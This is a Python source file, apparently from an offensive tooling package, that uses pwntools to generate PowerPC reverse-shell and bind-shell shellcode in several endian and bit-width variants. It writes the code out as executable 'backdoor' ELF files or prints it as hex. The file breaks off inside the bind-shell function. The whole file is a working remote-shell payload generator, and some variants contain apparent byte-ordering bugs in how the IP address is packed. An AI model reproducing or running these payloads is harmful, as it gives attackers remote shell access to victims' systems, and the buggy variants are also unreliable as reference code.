from pwn import *
from . import extract_shellcode
from colorama import Fore,Back,Style
from . import my_package
import string



'''
11.10 add powerpc reverse backdoor
execve 0xb
socket 0x146
connect 0x148
dup2   0x3f
bind 0x147
accept 0x14a
'''

def powerpc_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename = None):
	context.arch = 'powerpc'
	context.endian = 'big'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port='0x'+enhex(p16(reverse_port))
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	sth   r9, 30(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	'''
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += '''
		lis    9, 0x2f62
		ori    9, 9, 26990
		stw    9, 48(31)
		xor    9, 9, 9
		lis    9, 0x2f73
		ori    9, 9, 26624
		stw    9, 52(31)
		lis    9, 0x2d69
		stw    9, 60(31)
		addi   3, 31,0x30
		stwu   3, 0(31)
		addi   11, 31,60
		stwu   11, 4(31)
		addi   4, 31, -4
		xor    5, 5, 5
		li     0, 0xb
		sc
		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
		lis    9, 0x2f62
		ori    9, 9, 26990
		stw    9, 48(31)
		xor    9, 9, 9
		lis    9, 0x2f62
		ori    9, 9, 24947
		stw    9, 52(31)
		lis    9, 0x6800
		ori    9, 9, 0
		stw    9, 56(31)
		lis    9, 0x2d69
		stw    9, 60(31)
		addi   3, 31,0x30
		stwu   3, 0(31)
		addi   11, 31,60
		stwu   11, 4(31)
		addi   4, 31, -4
		xor    5, 5, 5
		li     0, 0xb
		sc
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if (envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = asm(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def ppc_reverse_sl(reverse_ip, reverse_port, filename = None):
	context.arch = 'powerpc'
	context.endian = 'big'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port='0x'+enhex(p16(reverse_port))
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	sth   r9, 30(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	li    r9, 0x2f62
	sth   r9, 48(r31)
	li    r9, 0x696e
	sth   r9, 50(r31)
	li    r9, 0x2f73
	sth   r9, 52(r31)
	li    r9, 0x6800
	sth   r9, 54(r31)
	addi  r3, r31,0x30
	stwu  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	'''
	shellcode = shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3)
	shellcode = asm(shellcode)
	shellcode_len=len(shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode

def ppcle_reverse_sl(reverse_ip, reverse_port, filename = None):
	context.arch = 'powerpc'
	context.endian = 'little'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port_1 = p16(reverse_port)[0]
	handle_port_2 = p16(reverse_port)[1]
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	stb   r9, 30(r31)
	li    r9, %s
	stb   r9, 31(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	lis    r9, 0x6e69
	ori    r9, r9, 0x622f
	stw   r9, 48(r31)
	xor  r9, r9, r9
	lis    r9, 0x68
	ori   r9, r9, 0x732f
	stw   r9, 52(r31)
	addi  r3, r31,0x30
	stwu  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	'''
	shellcode = shellcode%(handle_port_2 , handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3)
	shellcode = asm(shellcode)
	shellcode_len=len(shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode


def ppc64le_reverse_sl(reverse_ip, reverse_port, filename = None):
	context.arch = 'powerpc64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port_1 = p16(reverse_port)[0]
	handle_port_2 = p16(reverse_port)[1]
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	stb   r9, 30(r31)
	li    r9, %s
	stb   r9, 31(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	lis    r9, 0x6e69
	ori    r9, r9, 0x622f
	stw   r9, 48(r31)
	xor  r9, r9, r9
	lis    r9, 0x68
	ori   r9, r9, 0x732f
	stw   r9, 52(r31)
	addi  r3, r31,0x30
	std  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	'''
	shellcode = shellcode%(handle_port_2 , handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3)
	shellcode = asm(shellcode)
	shellcode_len=len(shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte idx in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode



'''
can't exame it 
'''

def powerpcle_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename=None):
	context.arch = 'powerpc'
	context.endian = 'little'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port_1 = p16(reverse_port)[0]
	handle_port_2 = p16(reverse_port)[1]
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	stb   r9, 30(r31)
	li    r9, %s
	stb   r9, 31(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	'''

	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += '''
		lis    r9, 0x6e69
		ori    r9, r9, 0x622f
		stw   r9, 48(r31)
		xor  r9, r9, r9
		lis    r9, 0x68
		ori   r9, r9, 0x732f
		stw   r9, 52(r31)
		addi  r3, r31,0x30
		stwu  r3, 0(r31)
		xor   r5, r5, r5
		stw   r5, 64(r31)
		lis   r9, 0x692d
		stw   r9, 60(r31)
		addi  r11, r31,62
		stwu  r11, 4(r31)
		addi  r4, r31, -4
		xor   r5, r5, r5
		li    r0, 0xb
		sc
		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
		lis    r9, 0x6e69
		ori    r9, r9, 0x622f
		stw   r9, 48(r31)
		xor  r9, r9, r9
		lis    r9, 0x7361
		ori   r9, r9, 0x622f
		stw   r9, 52(r31)
		lis    9, 0
		ori   r9, r9, 0x68
		stw    9, 56(31)
		addi  r3, r31,0x30
		stwu  r3, 0(r31)
		xor   r5, r5, r5
		stw   r5, 64(r31)
		lis   r9, 0x692d
		stw   r9, 60(r31)
		addi  r11, r31,62
		stwu  r11, 4(r31)
		addi  r4, r31, -4
		li    r0, 0xb
		sc
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = asm(shellcode % (handle_port_2,handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3))
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
pwoerpc64 reverse_shell_file 
add 2022.11.12
'''

def powerpc64_backdoor(shell_path ,reverse_ip, reverse_port,envp ,filename=None):
	context.arch = 'powerpc64'
	context.endian = 'big'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port='0x'+enhex(p16(reverse_port))
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	sth   r9, 30(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	'''
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += '''
		lis    9, 0x2f62
		ori    9, 9, 26990
		stw    9, 48(31)
		xor    9, 9, 9
		lis    9, 0x2f73
		ori    9, 9, 26624
		stw    9, 52(31)
		xor    5, 5, 5
		stw    5, 64(31)
		lis    9, 0x2d69
		stw    9, 60(31)
		addi   3, 31,0x30
		std   3, 0(31)
		addi   11, 31,60
		std   11, 8(31)
		std    5, 16(31)
		mr    4, 31
		li     0, 0xb
		sc
		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
		lis    9, 0x2f62
		ori    9, 9, 26990
		stw    9, 48(31)
		xor    9, 9, 9
		lis    9, 0x2f62
		ori    9, 9, 24947
		stw    9, 52(31)
		lis    9, 0x6800
		ori    9, 9, 0
		stw    9, 56(31)
		xor    5, 5, 5
		stw    5, 64(31)
		lis    9, 0x2d69
		stw    9, 60(31)
		addi   3, 31,0x30
		std   3, 0(31)
		addi   11, 31,60
		std   11, 8(31)
		std   5,  16(31)
		mr    r4, r31
		li     0, 0xb
		sc
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	#print(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
	shellcode = asm(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


'''
ip addres need change,
'''

def powerpc64le_backdoor(shell_path, reverse_ip, reverse_port, envp ,filename=None):
	context.arch = 'powerpc64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port_1 = str(p16(reverse_port)[0])
	handle_port_2 = str(p16(reverse_port)[1])
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	stb   r9, 30(r31)
	li    r9, %s
	stb   r9, 31(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	'''
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += '''
		lis    r9, 0x6e69
		ori    r9, r9, 0x622f
		stw   r9, 48(r31)
		xor  r9, r9, r9
		lis    r9, 0x68
		ori   r9, r9, 0x732f
		stw   r9, 52(r31)
		addi  r3, r31,0x30
		std  r3, 0(r31)
		xor   r5, r5, r5
		stw   r5, 64(r31)
		lis   r9, 0x692d
		stw   r9, 60(r31)
		addi  r11, r31,62
		std  r11, 8(r31)
		std  r5,  16(r31)
		mr   r4, r31
		li    r0, 0xb
		sc
		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
		lis    r9, 0x6e69
		ori    r9, r9, 0x622f
		stw   r9, 48(r31)
		xor  r9, r9, r9
		lis    r9, 0x7361
		ori   r9, r9, 0x622f
		stw   r9, 52(r31)
		lis    9, 0
		ori   r9, r9, 0x68
		stw    9, 56(31)
		addi  r3, r31,0x30
		std  r3, 0(r31)
		xor   r5, r5, r5
		stw   r5, 64(r31)
		lis   r9, 0x692d
		stw   r9, 60(r31)
		addi  r11, r31,62
		std  r11, 8(r31)
		std  r5, 16(r31)
		mr    r4, r31
		li    r0, 0xb
		sc
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	#print(shellcode%(handle_port, handle_ip_3, handle_ip_2, handle_ip_1, handle_ip_0))
	#shellcode = asm(shellcode%(handle_port, handle_ip_3, handle_ip_2, handle_ip_1, handle_ip_0))
	shellcode = asm(shellcode%(handle_port_2 , handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3))

	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

def ppc64_reverse_sl(reverse_ip, reverse_port, filename=None):
	context.arch = 'powerpc64'
	context.endian = 'big'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip = reverse_ip.split('.')
	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
	handle_ip_1="0x"+enhex(p8(int(reverse_ip[1])))
	handle_ip_2="0x"+enhex(p8(int(reverse_ip[2])))
	handle_ip_3="0x"+enhex(p8(int(reverse_ip[3])))
	handle_port='0x'+enhex(p16(reverse_port))
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	sth   r9, 30(r31)
	li    r9, %s
	stb   r9, 32(r31)
	li    r9, %s
	stb   r9, 33(r31)
	li    r9, %s
	stb   r9, 34(r31)
	li    r9, %s
	stb   r9, 35(r31)
	addi   r4, r31, 0x1c
	mr    r3, r17
	li    r5, 0x10
	li    r0, 0x148
	sc
	xor   r5, r5, r5
	mr    r3,r17
	li    r4,0
	li    r0,0x3f
	sc
	mr    r3,r17
	li    r4,1
	sc
	mr    r3,r17
	li    r4,2
	sc
	li    r9, 0x2f62
	sth   r9, 48(r31)
	li    r9, 0x696e
	sth   r9, 50(r31)
	li    r9, 0x2f73
	sth   r9, 52(r31)
	li    r9, 0x6800
	sth   r9, 54(r31)
	addi  r3, r31,0x30
	std  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	'''
	shellcode = shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3)
	shellcode = asm(shellcode)
	shellcode_len=len(shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode


def powerpc_bind_shell(listen_port , passwd, filename= None):
	context.arch = 'powerpc'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	#print(listen_port)
	handle_port='0x'+enhex(p16(listen_port))
	#print(handle_port)
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
	passwd_high = passwd[:6]
	passwd_low  = "0x"+passwd[6:10]
	shellcode = '''
	mr    r31,r1
	li    r3,2
	li    r4,1
	li    r5,0
	li    r0,0x146
	sc
	mr    r17,r3
	xor   r9,r9,r9
	stw   r9, 28(r31)
	stw   r9, 32(r31)
	stw   r9, 36(r31)
	stw   r9, 36(r31)
	stw   r9, 40(r31)
	stw   r9, 44(r31)
	stw   r9, 48(r31)
	stw   r9, 52(r31)
	stw   r9, 56(r31)
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 2
	sth   r9, 28(r31)
	li    r9, %s
	sth   r9, 30(r31)
	stw   r5, 32(r31)
	addi  r4, r31, 0x1c
	li   r5, 0x10
	li   r0, 0x147
	sc
	xor  r5, r5, r5
	mr   r3, r17
	li   r4, 0x101
	li   r0, 0x149
	sc
	mr   r3, r17
	li   r4, 0
	li   r5, 0
	li   r0, 0x14a
	sc
	mr   r16, r3
	li   r4, 0
	li   r0, 0x3f
	sc
	mr   r3, r16
	li   r4, 1
	sc
	mr   r3, r16
	li   r4, 2
	sc
	lis  r9, 0x5061
	ori  r9, r9, 0x7373
	stw  r9, -20(r31)
	lis  r9, 0x7764
	ori  r9, r9, 0x3a20
	stw  r9, -16(r31)
	li   r3, 1
